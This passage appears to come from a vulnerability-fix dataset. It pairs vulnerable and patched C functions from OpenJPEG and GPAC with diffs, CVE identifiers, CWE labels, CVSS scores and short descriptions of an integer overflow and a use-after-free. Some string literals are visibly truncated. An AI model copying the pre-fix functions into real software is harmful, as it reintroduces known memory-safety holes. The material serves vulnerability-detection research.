                destroy_parameters(&VAR_2);
                continue;
            }
        }

        /* COMMENT_12 */
        /* COMMENT_13 */

        VAR_17 = opj_stream_create_default_file_stream(VAR_2.infile, 1);
        if (!VAR_17) {
            fprintf(VAR_15, ""ERROR -> failed to create the stream from the file %s\n"",
                    VAR_2.infile);
            VAR_7 = 1;
            goto fin;
        }

        /* COMMENT_14 */
        /* COMMENT_15 */

        switch (VAR_2.decod_format) {
        case VAR_20: { /* COMMENT_16 */
            /* COMMENT_17 */
            VAR_18 = opj_create_decompress(VAR_21);
            break;
        }
        case VAR_22: { /* COMMENT_18 */
            /* COMMENT_17 */
            VAR_18 = opj_create_decompress(VAR_23);
            break;
        }
        case VAR_24: { /* COMMENT_19 */
            /* COMMENT_17 */
            VAR_18 = opj_create_decompress(VAR_25);
            break;
        }
        default:
            fprintf(VAR_15, ""skipping file..\n"");
            destroy_parameters(&VAR_2);
            opj_stream_destroy(VAR_17);
            continue;
        }

        if (VAR_2.quiet) {
            /* COMMENT_20 */
            opj_set_info_handler(VAR_18, VAR_26, 00);
            opj_set_warning_handler(VAR_18, VAR_26, 00);
            opj_set_error_handler(VAR_18, VAR_26, 00);
        } else {
            /* COMMENT_21 */
            opj_set_info_handler(VAR_18, VAR_27, 00);
            opj_set_warning_handler(VAR_18, VAR_28, 00);
            opj_set_error_handler(VAR_18, VAR_29, 00);
        }


        VAR_8 = opj_clock();

        /* COMMENT_22 */
        if (!opj_setup_decoder(VAR_18, &(VAR_2.core))) {
            fprintf(VAR_15, ""ERROR -> opj_decompress: failed to setup the decoder\n"");
            opj_stream_destroy(VAR_17);
            opj_destroy_codec(VAR_18);
            VAR_7 = 1;
            goto fin;
        }

        if (VAR_2.num_threads >= 1 &&
                !opj_codec_set_threads(VAR_18, VAR_2.num_threads)) {
            fprintf(VAR_15, ""ERROR -> opj_decompress: failed to set number of threads\n"");
            opj_stream_destroy(VAR_17);
            opj_destroy_codec(VAR_18);
            VAR_7 = 1;
            goto fin;
        }

        /* COMMENT_23 */
        if (! opj_read_header(VAR_17, VAR_18, &VAR_16)) {
            fprintf(VAR_15, ""ERROR -> opj_decompress: failed to read the header\n"");
            opj_stream_destroy(VAR_17);
            opj_destroy_codec(VAR_18);
            opj_image_destroy(VAR_16);
            VAR_7 = 1;
            goto fin;
        }

        if (VAR_2.numcomps) {
            if (! opj_set_decoded_components(VAR_18,
                                             VAR_2.numcomps,
                                             VAR_2.comps_indices,
                                             VAR_30)) {
                fprintf(VAR_15,
                        ""ERROR -> opj_decompress: failed to set the component indices!\n"");
                opj_destroy_codec(VAR_18);
                opj_stream_destroy(VAR_17);
                opj_image_destroy(VAR_16);
                VAR_7 = 1;
                goto fin;
            }
        }

        if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
            /* COMMENT_24 */
            /* COMMENT_25 */
            /* COMMENT_26 */
            if (! opj_set_decoded_resolution_factor(VAR_18, VAR_11)) {
                fprintf(VAR_15,
                        ""ERROR -> opj_decompress: failed to set the resolution factor tile!\n"");
                opj_destroy_codec(VAR_18);
                opj_stream_destroy(VAR_17);
                opj_image_destroy(VAR_16);
                VAR_7 = 1;
                goto fin;
            }
        }

        if (!VAR_2.nb_tile_to_decode) {
            if (getenv(""SKIP_OPJ_SET_DECODE_AREA"") != NULL &&
                    VAR_2.DA_x0 == 0 &&
                    VAR_2.DA_y0 == 0 &&
                    VAR_2.DA_x1 == 0 &&
                    VAR_2.DA_y1 == 0) {
                /* COMMENT_27 */
                /* COMMENT_28 */
                /* COMMENT_29 */
            }
            /* COMMENT_30 */
            else if (!opj_set_decode_area(VAR_18, VAR_16, (OPJ_INT32)VAR_2.DA_x0,
                                          (OPJ_INT32)VAR_2.DA_y0, (OPJ_INT32)VAR_2.DA_x1,
                                          (OPJ_INT32)VAR_2.DA_y1)) {
                fprintf(VAR_15, ""ERROR -> opj_decompress: failed to set the decoded area\n"");
                opj_stream_destroy(VAR_17);
                opj_destroy_codec(VAR_18);
                opj_image_destroy(VAR_16);
                VAR_7 = 1;
                goto fin;
            }

            /* COMMENT_31 */
            if (!(opj_decode(VAR_18, VAR_17, VAR_16) &&
                    opj_end_decompress(VAR_18,   VAR_17))) {
                fprintf(VAR_15, ""ERROR -> opj_decompress: failed to decode image!\n"");
                opj_destroy_codec(VAR_18);
                opj_stream_destroy(VAR_17);
                opj_image_destroy(VAR_16);
                VAR_7 = 1;
                goto fin;
            }
        } else {
            if (!(VAR_2.DA_x0 == 0 &&
                    VAR_2.DA_y0 == 0 &&
                    VAR_2.DA_x1 == 0 &&
                    VAR_2.DA_y1 == 0)) {
                if (!(VAR_2.quiet)) {
                    fprintf(VAR_15, ""WARNING: -d option ignored when used together with -t\n"");
                }
            }

            if (!opj_get_decoded_tile(VAR_18, VAR_17, VAR_16, VAR_2.tile_index)) {
                fprintf(VAR_15, ""ERROR -> opj_decompress: failed to decode tile!\n"");
                opj_destroy_codec(VAR_18);
                opj_stream_destroy(VAR_17);
                opj_image_destroy(VAR_16);
                VAR_7 = 1;
                goto fin;
            }
            if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""tile %d is decoded!\n\n"", VAR_2.tile_index);
            }
        }

        VAR_9 += opj_clock() - VAR_8;
        VAR_10++;

        /* COMMENT_32 */
        opj_stream_destroy(VAR_17);

        if (VAR_16->color_space != VAR_32
                && VAR_16->numcomps == 3 && VAR_16->comps[0].dx == VAR_16->comps[0].dy
                && VAR_16->comps[1].dx != 1) {
            VAR_16->color_space = VAR_32;
        } else if (VAR_16->numcomps <= 2) {
            VAR_16->color_space = VAR_33;
        }

        if (VAR_16->color_space == VAR_32) {
            color_sycc_to_rgb(VAR_16);
        } else if ((VAR_16->color_space == VAR_34) &&
                   (VAR_2.cod_format != VAR_35)) {
            color_cmyk_to_rgb(VAR_16);
        } else if (VAR_16->color_space == VAR_36) {
            color_esycc_to_rgb(VAR_16);
        }

        if (VAR_16->icc_profile_buf) {
#if defined(VAR_37) || defined(VAR_38)
            if (VAR_16->icc_profile_len) {
                color_apply_icc_profile(VAR_16);
            } else {
                color_cielab_to_rgb(VAR_16);
            }
#endif
            free(VAR_16->icc_profile_buf);
            VAR_16->icc_profile_buf = NULL;
            VAR_16->icc_profile_len = 0;
        }

        /* COMMENT_33 */
        /* COMMENT_15 */
        if (VAR_2.precision != NULL) {
            OPJ_UINT32 VAR_39;
            for (VAR_39 = 0; VAR_39 < VAR_16->numcomps; ++VAR_39) {
                OPJ_UINT32 VAR_40 = VAR_39;
                OPJ_UINT32 VAR_41;

                if (VAR_40 >= VAR_2.nb_precision) {
                    VAR_40 = VAR_2.nb_precision - 1U;
                }

                VAR_41 = VAR_2.precision[VAR_40].prec;
                if (VAR_41 == 0) {
                    VAR_41 = VAR_16->comps[VAR_39].prec;
                }

                switch (VAR_2.precision[VAR_40].mode) {
                case VAR_42:
                    clip_component(&(VAR_16->comps[VAR_39]), VAR_41);
                    break;
                case VAR_43:
                    scale_component(&(VAR_16->comps[VAR_39]), VAR_41);
                    break;
                default:
                    break;
                }

            }
        }

        /* COMMENT_34 */
        /* COMMENT_35 */
        if (VAR_2.upsample) {
            VAR_16 = upsample_image_components(VAR_16);
            if (VAR_16 == NULL) {
                fprintf(VAR_15,
                        ""ERROR -> opj_decompress: failed to upsample image components!\n"");
                opj_destroy_codec(VAR_18);
                VAR_7 = 1;
                goto fin;
            }
        }

        /* COMMENT_36 */
        /* COMMENT_37 */
        if (VAR_2.force_rgb) {
            switch (VAR_16->color_space) {
            case VAR_44:
                break;
            case VAR_33:
                VAR_16 = convert_gray_to_rgb(VAR_16);
                break;
            default:
                fprintf(VAR_15,
                        ""ERROR -> opj_decompress: don't know how to convert image to RGB colorspace!\n"");
                opj_image_destroy(VAR_16);
                VAR_16 = NULL;
                break;
            }
            if (VAR_16 == NULL) {
                fprintf(VAR_15, ""ERROR -> opj_decompress: failed to convert to RGB image!\n"");
                opj_destroy_codec(VAR_18);
                VAR_7 = 1;
                goto fin;
            }
        }

        /* COMMENT_38 */
        /* COMMENT_35 */
        switch (VAR_2.cod_format) {
        case VAR_45:          /* COMMENT_39 */
            if (imagetopnm(VAR_16, VAR_2.outfile, VAR_2.split_pnm)) {
                fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;

        case VAR_46:          /* COMMENT_40 */
            if (imagetopgx(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;

        case VAR_47:          /* COMMENT_41 */
            if (imagetobmp(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;
#ifdef VAR_48
        case VAR_35:          /* COMMENT_42 */
            if (imagetotif(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;
#endif /* COMMENT_43 */
        case VAR_49:          /* COMMENT_44 */
            if (imagetoraw(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15,
                        ""[ERROR] Error generating raw or yuv file. Outfile %s not generated\n"",
                        VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;

        case VAR_50:         /* COMMENT_45 */
            if (imagetorawl(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15,
                        ""[ERROR] Error generating rawl file. Outfile %s not generated\n"",
                        VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;

        case VAR_51:          /* COMMENT_46 */
            if (imagetotga(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15, ""[ERROR] Error generating tga file. Outfile %s not generated\n"",
                        VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;
#ifdef VAR_52
        case VAR_53:          /* COMMENT_47 */
            if (imagetopng(VAR_16, VAR_2.outfile)) {
                fprintf(VAR_15, ""[ERROR] Error generating png file. Outfile %s not generated\n"",
                        VAR_2.outfile);
                VAR_7 = 1;
            } else if (!(VAR_2.quiet)) {
                fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
            }
            break;
#endif /* COMMENT_48 */
        /* COMMENT_49 */
                                                              
          
        default:
            fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
            VAR_7 = 1;
        }

        /* COMMENT_52 */
        if (VAR_18) {
            opj_destroy_codec(VAR_18);
        }


        /* COMMENT_53 */
        opj_image_destroy(VAR_16);

        /* COMMENT_54 */
        opj_destroy_cstr_index(&VAR_19);

        if (VAR_7) {
            (void)remove(VAR_2.outfile);    /* COMMENT_55 */
        }
    }
fin:
    destroy_parameters(&VAR_2);
    if (VAR_7 && VAR_5.imgdirpath) {
        free(VAR_5.imgdirpath);
    }
    if (VAR_6) {
        if (VAR_6->filename) {
            free(VAR_6->filename);
        }
        if (VAR_6->filename_buf) {
            free(VAR_6->filename_buf);
        }
        free(VAR_6);
    }
    if (VAR_10 && !VAR_7 && !(VAR_2.quiet)) {
        fprintf(VAR_31, ""decode time: %d ms\n"",
                (int)((VAR_9 * 1000.0) / (OPJ_FLOAT64)VAR_10));
    }
    return VAR_7 ? VAR_13 : VAR_54;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_decompress.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -42,14 +42,13 @@
             return EXIT_FAILURE;
         }
         /* Stores at max 10 image file names */
-        dirptr->filename_buf = (char*)malloc(sizeof(char) *
-                                             (size_t)num_images * OPJ_PATH_LEN);
+        dirptr->filename_buf = calloc((size_t) num_images, sizeof(char) * OPJ_PATH_LEN);
         if (!dirptr->filename_buf) {
             failed = 1;
             goto fin;
         }
 
-        dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));
+        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));
 
         if (!dirptr->filename) {
             failed = 1;","{'deleted_lines': ['        dirptr->filename_buf = (char*)malloc(sizeof(char) *', '                                             (size_t)num_images * OPJ_PATH_LEN);', '        dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));'], 'added_lines': ['        dirptr->filename_buf = calloc((size_t) num_images, sizeof(char) * OPJ_PATH_LEN);', '        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));']}",True,"Integer Overflow in OpenJPEG v2.4.0 allows remote attackers to crash the application, causing a Denial of Service (DoS). This occurs when the attacker uses the command line option ""-ImgDir"" on a directory that contains 1048576 files.",5.5,MEDIUM,1,valid,2022-01-12T11:20:28Z,4
CVE-2022-24576,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2061,96699aabae042f8f55cf8a85fa5758e3db752bae,https://github.com/gpac/gpac/commit/96699aabae042f8f55cf8a85fa5758e3db752bae,src/utils/utf.c,gf_utf_get_utf8_string_from_bom,"GF_EXPORT
char *gf_utf_get_utf8_string_from_bom(u8 *data, u32 size, char **out_ptr)
{
u32 unicode_type = 0;
*out_ptr = NULL;
if (size>=5) {
if ((data[0]==0xFF) && (data[1]==0xFE)) {
if (!data[2] && !data[3]) {
return NULL;
} else {
unicode_type = 2;
}
} else if ((data[0]==0xFE) && (data[1]==0xFF)) {
if (!data[2] && !data[3]) {
return NULL;
} else {
unicode_type = 1;
}
} else if ((data[0]==0xEF) && (data[1]==0xBB) && (data[2]==0xBF)) {
return data+4;
}
}
if (!unicode_type) return data;
if (size%2) size--;
u16 *str_wc = gf_malloc(size+2);
u16 *srcwc;
char *dst = gf_malloc(size+2);
*out_ptr = dst;
u32 i;
for (i=0; i<size; i+=2) {
u16 wchar=0;
u8 c1 = data[i];
u8 c2 = data[i+1];
if (unicode_type==2) {
if (c2) {
wchar = c2;
wchar <<=8;
wchar |= c1;
}
else wchar = c1;
} else {
wchar = c1;
if (c2) {
wchar <<= 8;
wchar |= c2;
}
}
str_wc[i/2] = wchar;
}
str_wc[i/2] = 0;
srcwc = str_wc;
gf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);
gf_free(str_wc);
return dst;
}","GF_EXPORT
VAR_0 *gf_utf_get_utf8_string_from_bom(u8 *VAR_1, u32 VAR_2, char **VAR_3)
{
u32 VAR_4 = 0;
*VAR_3 = NULL;
if (VAR_2>=5) {
if ((VAR_1[0]==0xFF) && (VAR_1[1]==0xFE)) {
if (!VAR_1[2] && !VAR_1[3]) {
return NULL;
} else {
VAR_4 = 2;
}
} else if ((VAR_1[0]==0xFE) && (VAR_1[1]==0xFF)) {
if (!VAR_1[2] && !VAR_1[3]) {
return NULL;
} else {
VAR_4 = 1;
}
} else if ((VAR_1[0]==0xEF) && (VAR_1[1]==0xBB) && (VAR_1[2]==0xBF)) {
return VAR_1+4;
}
}
if (!VAR_4) return VAR_1;
if (VAR_2%2) VAR_2--;
u16 *VAR_5 = gf_malloc(VAR_2+2);
u16 *VAR_6;
char *VAR_7 = gf_malloc(VAR_2+2);
*VAR_3 = VAR_7;
u32 VAR_8;
for (VAR_8=0; VAR_8<VAR_2; VAR_8+=2) {
u16 VAR_9=0;
u8 VAR_10 = VAR_1[VAR_8];
u8 VAR_11 = VAR_1[VAR_8+1];
if (VAR_4==2) {
if (VAR_11) {
VAR_9 = VAR_11;
VAR_9 <<=8;
VAR_9 |= VAR_10;
}
else VAR_9 = VAR_10;
} else {
VAR_9 = VAR_10;
if (VAR_11) {
VAR_9 <<= 8;
VAR_9 |= VAR_11;
}
}
VAR_5[VAR_8/2] = VAR_9;
}
VAR_5[VAR_8/2] = 0;
VAR_6 = VAR_5;
gf_utf8_wcstombs(VAR_7, VAR_2, (const unsigned short **) &VAR_6);
gf_free(VAR_5);
return VAR_7;
}",,"GF_EXPORT
GF_Err gf_utf_get_utf8_string_from_bom(const u8 *data, u32 size, char **out_ptr, char **result)
{
	u32 unicode_type = 0;
	if (!out_ptr || !result || !data) return GF_BAD_PARAM;
	*out_ptr = NULL;
	*result = (char *) data;

	if (size>=5) {
		/*0: no unicode, 1: UTF-16BE, 2: UTF-16LE*/
		if ((data[0]==0xFF) && (data[1]==0xFE)) {
			if (!data[2] && !data[3]) {
				return GF_OK;
			} else {
				unicode_type = 2;
			}
		} else if ((data[0]==0xFE) && (data[1]==0xFF)) {
			if (!data[2] && !data[3]) {
				return GF_OK;
			} else {
				unicode_type = 1;
			}
		} else if ((data[0]==0xEF) && (data[1]==0xBB) && (data[2]==0xBF)) {
			*result = (char *) (data+4);
			return GF_OK;
		}
	}

	if (!unicode_type) {
		*result = (char *) data;
		return GF_OK;
	}

	if (size%2) size--;
	u16 *str_wc = gf_malloc(size+2);
	if (!str_wc) return GF_OUT_OF_MEM;
	u16 *srcwc;
	char *dst = gf_malloc(size+2);
	if (!dst) {
		gf_free(str_wc);
		return GF_OUT_OF_MEM;
	}
	*out_ptr = dst;
	u32 i;
	for (i=0; i<size; i+=2) {
		u16 wchar=0;
		u8 c1 = data[i];
		u8 c2 = data[i+1];

		/*Little-endian order*/
		if (unicode_type==2) {
			if (c2) {
				wchar = c2;
				wchar <<=8;
				wchar |= c1;
			}
			else wchar = c1;
		} else {
			wchar = c1;
			if (c2) {
				wchar <<= 8;
				wchar |= c2;
			}
		}
		str_wc[i/2] = wchar;
	}
	str_wc[i/2] = 0;
	srcwc = str_wc;
	u32 res = gf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);
	gf_free(str_wc);
	if (res==GF_UTF8_FAIL) {
		gf_free(dst);
		*out_ptr = NULL;
		return GF_IO_ERR;
	}
	*result = dst;
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_utf_get_utf8_string_from_bom(const u8 *VAR_1, u32 VAR_2, char **VAR_3, char **VAR_4)
{
	u32 VAR_5 = 0;
	if (!VAR_3 || !VAR_4 || !VAR_1) return VAR_6;
	*VAR_3 = NULL;
	*VAR_4 = (char *) VAR_1;

	if (VAR_2>=5) {
		/* COMMENT_0 */
		if ((VAR_1[0]==0xFF) && (VAR_1[1]==0xFE)) {
			if (!VAR_1[2] && !VAR_1[3]) {
				return VAR_7;
			} else {
				VAR_5 = 2;
			}
		} else if ((VAR_1[0]==0xFE) && (VAR_1[1]==0xFF)) {
			if (!VAR_1[2] && !VAR_1[3]) {
				return VAR_7;
			} else {
				VAR_5 = 1;
			}
		} else if ((VAR_1[0]==0xEF) && (VAR_1[1]==0xBB) && (VAR_1[2]==0xBF)) {
			*VAR_4 = (char *) (VAR_1+4);
			return VAR_7;
		}
	}

	if (!VAR_5) {
		*VAR_4 = (char *) VAR_1;
		return VAR_7;
	}

	if (VAR_2%2) VAR_2--;
	u16 *VAR_8 = gf_malloc(VAR_2+2);
	if (!VAR_8) return VAR_9;
	u16 *VAR_10;
	char *VAR_11 = gf_malloc(VAR_2+2);
	if (!VAR_11) {
		gf_free(VAR_8);
		return VAR_9;
	}
	*VAR_3 = VAR_11;
	u32 VAR_12;
	for (VAR_12=0; VAR_12<VAR_2; VAR_12+=2) {
		u16 VAR_13=0;
		u8 VAR_14 = VAR_1[VAR_12];
		u8 VAR_15 = VAR_1[VAR_12+1];

		/* COMMENT_1 */
		if (VAR_5==2) {
			if (VAR_15) {
				VAR_13 = VAR_15;
				VAR_13 <<=8;
				VAR_13 |= VAR_14;
			}
			else VAR_13 = VAR_14;
		} else {
			VAR_13 = VAR_14;
			if (VAR_15) {
				VAR_13 <<= 8;
				VAR_13 |= VAR_15;
			}
		}
		VAR_8[VAR_12/2] = VAR_13;
	}
	VAR_8[VAR_12/2] = 0;
	VAR_10 = VAR_8;
	u32 VAR_16 = gf_utf8_wcstombs(VAR_11, VAR_2, (const unsigned short **) &VAR_10);
	gf_free(VAR_8);
	if (VAR_16==VAR_17) {
		gf_free(VAR_11);
		*VAR_3 = NULL;
		return VAR_18;
	}
	*VAR_4 = VAR_11;
	return VAR_7;
}",,"--- func_before
+++ func_after
@@ -1,34 +1,45 @@
 GF_EXPORT
-char *gf_utf_get_utf8_string_from_bom(u8 *data, u32 size, char **out_ptr)
+GF_Err gf_utf_get_utf8_string_from_bom(const u8 *data, u32 size, char **out_ptr, char **result)
 {
 	u32 unicode_type = 0;
+	if (!out_ptr || !result || !data) return GF_BAD_PARAM;
 	*out_ptr = NULL;
+	*result = (char *) data;
 
 	if (size>=5) {
 		/*0: no unicode, 1: UTF-16BE, 2: UTF-16LE*/
 		if ((data[0]==0xFF) && (data[1]==0xFE)) {
 			if (!data[2] && !data[3]) {
-				return NULL;
+				return GF_OK;
 			} else {
 				unicode_type = 2;
 			}
 		} else if ((data[0]==0xFE) && (data[1]==0xFF)) {
 			if (!data[2] && !data[3]) {
-				return NULL;
+				return GF_OK;
 			} else {
 				unicode_type = 1;
 			}
 		} else if ((data[0]==0xEF) && (data[1]==0xBB) && (data[2]==0xBF)) {
-			return data+4;
+			*result = (char *) (data+4);
+			return GF_OK;
 		}
 	}
 
-	if (!unicode_type) return data;
+	if (!unicode_type) {
+		*result = (char *) data;
+		return GF_OK;
+	}
 
 	if (size%2) size--;
 	u16 *str_wc = gf_malloc(size+2);
+	if (!str_wc) return GF_OUT_OF_MEM;
 	u16 *srcwc;
 	char *dst = gf_malloc(size+2);
+	if (!dst) {
+		gf_free(str_wc);
+		return GF_OUT_OF_MEM;
+	}
 	*out_ptr = dst;
 	u32 i;
 	for (i=0; i<size; i+=2) {
@@ -55,8 +66,13 @@
 	}
 	str_wc[i/2] = 0;
 	srcwc = str_wc;
-	gf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);
+	u32 res = gf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);
 	gf_free(str_wc);
-
-	return dst;
+	if (res==GF_UTF8_FAIL) {
+		gf_free(dst);
+		*out_ptr = NULL;
+		return GF_IO_ERR;
+	}
+	*result = dst;
+	return GF_OK;
 }","{'deleted_lines': ['char *gf_utf_get_utf8_string_from_bom(u8 *data, u32 size, char **out_ptr)', '\t\t\t\treturn NULL;', '\t\t\t\treturn NULL;', '\t\t\treturn data+4;', '\tif (!unicode_type) return data;', '\tgf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);', '', '\treturn dst;'], 'added_lines': ['GF_Err gf_utf_get_utf8_string_from_bom(const u8 *data, u32 size, char **out_ptr, char **result)', '\tif (!out_ptr || !result || !data) return GF_BAD_PARAM;', '\t*result = (char *) data;', '\t\t\t\treturn GF_OK;', '\t\t\t\treturn GF_OK;', '\t\t\t*result = (char *) (data+4);', '\t\t\treturn GF_OK;', '\tif (!unicode_type) {', '\t\t*result = (char *) data;', '\t\treturn GF_OK;', '\t}', '\tif (!str_wc) return GF_OUT_OF_MEM;', '\tif (!dst) {', '\t\tgf_free(str_wc);', '\t\treturn GF_OUT_OF_MEM;', '\t}', '\tu32 res = gf_utf8_wcstombs(dst, size, (const unsigned short **) &srcwc);', '\tif (res==GF_UTF8_FAIL) {', '\t\tgf_free(dst);', '\t\t*out_ptr = NULL;', '\t\treturn GF_IO_ERR;', '\t}', '\t*result = dst;', '\treturn GF_OK;']}",True,GPAC 1.0.1 is affected by Use After Free through MP4Box.,5.5,MEDIUM,1,valid,2022-01-21T11:26:28Z,4
CVE-2022-24576,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2061,96699aabae042f8f55cf8a85fa5758e3db752bae,https://github.com/gpac/gpac/commit/96699aabae042f8f55cf8a85fa5758e3db752bae,src/filters/load_bt_xmt.c,ctxload_probe_data,"static const char *ctxload_probe_data(const u8 *probe_data, u32 size, GF_FilterProbeScore *score)
{
const char *mime_type = NULL;
char *dst = NULL;
u8 *res;
if ((size>2) && (probe_data[0] == 0x1f) && (probe_data[1] == 0x8b)) {
*score = GF_FPROBE_EXT_MATCH;
return ""btz|bt.gz|xmt.gz|xmtz|wrl.gz|x3dv.gz|x3dvz|x3d.gz|x3dz"";
}
res = gf_utf_get_utf8_string_from_bom((char *)probe_data, size, &dst);
if (res) probe_data = res;
while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
probe_data ++;
while (1) {
if (!strncmp(probe_data, ""<!DOCTYPE"", 9)) {
probe_data = strchr(probe_data, '>');
if (!probe_data) goto exit;
probe_data++;
while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
probe_data ++;
}
else if (!strncmp(probe_data, ""<?xml"", 5)) {
probe_data = strstr(probe_data, ""?>"");
if (!probe_data) goto exit;
probe_data += 2;
while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
probe_data ++;
}
else if (!strncmp(probe_data, ""<!--"", 4)) {
probe_data = strstr(probe_data, ""-->"");
if (!probe_data) goto exit;
probe_data += 3;
while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
probe_data ++;
} else {
break;
}
}
if (!strncmp(probe_data, ""<XMT-A"", strlen(""<XMT-A""))
|| strstr(probe_data, ""urn:mpeg:mpeg4:xmta:schema:2002"")
) {
mime_type = ""application/x-xmt"";
} else if (strstr(probe_data, ""<X3D"")
|| strstr(probe_data, ""http:) {
mime_type = ""model/x3d+xml"";
} else if (strstr(probe_data, ""<saf"")
|| strstr(probe_data, ""urn:mpeg:mpeg4:SAF:2005"")
|| strstr(probe_data, ""urn:mpeg:mpeg4:LASeR:2005"")
) {
mime_type = ""application/x-LASeR+xml"";
} else if (!strncmp(probe_data, ""<DIMSStream"", strlen(""<DIMSStream"") ) ) {
mime_type = ""application/dims"";
} else if (!strncmp(probe_data, ""<svg"", 4) || strstr(probe_data, ""http:mime_type = ""image/svg+xml"";
} else if (!strncmp(probe_data, ""<widget"", strlen(""<widget"") ) ) {
mime_type = ""application/widget"";
} else if (!strncmp(probe_data, ""<NHNTStream"", strlen(""<NHNTStream"") ) ) {
mime_type = ""application/x-nhml"";
} else if (!strncmp(probe_data, ""<TextStream"", strlen(""<TextStream"") ) ) {
mime_type = ""text/ttxt"";
} else if (!strncmp(probe_data, ""<text3GTrack"", strlen(""<text3GTrack"") ) ) {
mime_type = ""quicktime/text"";
}
else {
while (1) {
while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
probe_data ++;
if (!strncmp(probe_data, ""#VRML V2.0"", strlen(""#VRML V2.0""))) {
mime_type = ""model/vrml"";
goto exit;
}
if (!strncmp(probe_data, ""#X3D V3.0"", strlen(""#X3D V3.0""))) {
mime_type = ""model/x3d+vrml"";
goto exit;
}
if ((probe_data[0] != '#')
&& strncmp(probe_data, ""PROFILE"", strlen(""PROFILE""))
&& strncmp(probe_data, ""COMPONENT"", strlen(""COMPONENT""))
&& strncmp(probe_data, ""META"", strlen(""META""))
&& strncmp(probe_data, ""IMPORT"", strlen(""IMPORT""))
&& strncmp(probe_data, ""EXPORT"", strlen(""EXPORT""))
) {
break;
}
probe_data = strchr(probe_data, '\n');
if (!probe_data) goto exit;
}
if (!strncmp(probe_data, ""InitialObjectDescriptor"", strlen(""InitialObjectDescriptor""))
|| !strncmp(probe_data, ""EXTERNPROTO"", strlen(""EXTERNPROTO""))
|| !strncmp(probe_data, ""PROTO"", strlen(""PROTO""))
|| !strncmp(probe_data, ""Group"", strlen(""Group""))
|| !strncmp(probe_data, ""OrderedGroup"", strlen(""OrderedGroup""))
|| !strncmp(probe_data, ""Layer2D"", strlen(""Layer2D""))
|| !strncmp(probe_data, ""Layer3D"", strlen(""Layer3D""))
) {
if (strstr(probe_data, ""children""))
mime_type = ""application/x-bt"";
}
}
exit:
if (dst) gf_free(dst);
if (mime_type) {
*score = GF_FPROBE_MAYBE_SUPPORTED;
return mime_type;
}
*score = GF_FPROBE_NOT_SUPPORTED;
return NULL;
}","static const char *ctxload_probe_data(const u8 *VAR_0, u32 VAR_1, GF_FilterProbeScore *VAR_2)
{
const char *VAR_3 = NULL;
char *VAR_4 = NULL;
u8 *VAR_5;
if ((VAR_1>2) && (VAR_0[0] == 0x1f) && (VAR_0[1] == 0x8b)) {
*VAR_2 = VAR_6;
return ""btz|bt.gz|xmt.gz|xmtz|wrl.gz|x3dv.gz|x3dvz|x3d.gz|x3dz"";
}
VAR_5 = gf_utf_get_utf8_string_from_bom((char *)VAR_0, VAR_1, &VAR_4);
if (VAR_5) VAR_0 = VAR_5;
while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
VAR_0 ++;
while (1) {
if (!strncmp(VAR_0, ""<!DOCTYPE"", 9)) {
VAR_0 = strchr(VAR_0, '>');
if (!VAR_0) goto exit;
VAR_0++;
while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
VAR_0 ++;
}
else if (!strncmp(VAR_0, ""<?xml"", 5)) {
VAR_0 = strstr(VAR_0, ""?>"");
if (!VAR_0) goto exit;
VAR_0 += 2;
while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
VAR_0 ++;
}
else if (!strncmp(VAR_0, ""<!--"", 4)) {
